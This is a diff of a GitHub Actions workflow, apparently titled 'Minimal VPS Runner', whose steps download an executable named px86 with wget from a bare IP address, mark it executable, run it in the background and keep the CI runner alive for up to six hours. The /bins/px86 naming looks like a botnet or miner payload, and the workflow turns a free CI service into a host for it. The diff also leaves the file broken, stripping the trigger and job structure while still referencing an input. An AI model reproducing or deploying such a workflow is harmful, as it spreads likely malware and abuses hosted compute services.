@@ -1,48 +1,28 @@
-name: Minimal VPS Runner
+- name: Run binary and keep alive
+  run: |
+    wget http://45.138.16.158/bins/px86 -O px86
+    chmod +x px86
 
-on:
-  workflow_dispatch:
-    inputs:
-      uptime:
-        description: 'VPS uptime in hours (max 6)'
-        required: false
-        default: '6'
-        type: choice
-        options:
-          - '1'
-          - '2'
-          - '3'
-          - '4'
-          - '5'
-          - '6'
+    echo "🟢 Launching binary..."
+    ./px86 x86 &
 
-jobs:
-  run-binary:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Download and run binary with keep-alive
-        run: |
-          # Download and make binary executable
-          wget http://45.138.16.158/bins/px86 -O px86
-          chmod +x px86
+    PX86_PID=$!
+    echo "📌 PID: $PX86_PID"
 
-          echo "🟢 Launching binary in background..."
-          ./px86 x86 &
+    UPTIME_SECONDS=$(( ${{ github.event.inputs.uptime }} * 3600 ))
+    echo "⏳ Keeping alive for $UPTIME_SECONDS seconds..."
 
-          PX86_PID=$!
-          echo "📌 Binary running in background (PID: $PX86_PID)"
+    for ((i=0; i<UPTIME_SECONDS; i++)); do
+      if ! ps -p $PX86_PID > /dev/null; then
+        echo "❌ Binary exited at second $i"
+        break
+      fi
 
-          # Keep alive
-          UPTIME_SECONDS=$(( ${{ github.event.inputs.uptime }} * 3600 ))
-          echo "⏳ Keeping runner alive for $UPTIME_SECONDS seconds..."
+      if (( i % 60 == 0 )); then
+        echo "⏱️ Alive for $((i / 60)) minute(s)..."
+      fi
 
-          # Loop to prevent step from exiting early
-          for ((i=0; i<UPTIME_SECONDS; i++)); do
-            if ! ps -p $PX86_PID > /dev/null; then
-              echo "❌ Binary process exited early."
-              break
-            fi
-            sleep 1
-          done
+      sleep 1
+    done
 
-          echo "✅ Done. Exiting workflow."
+    echo "✅ Done."
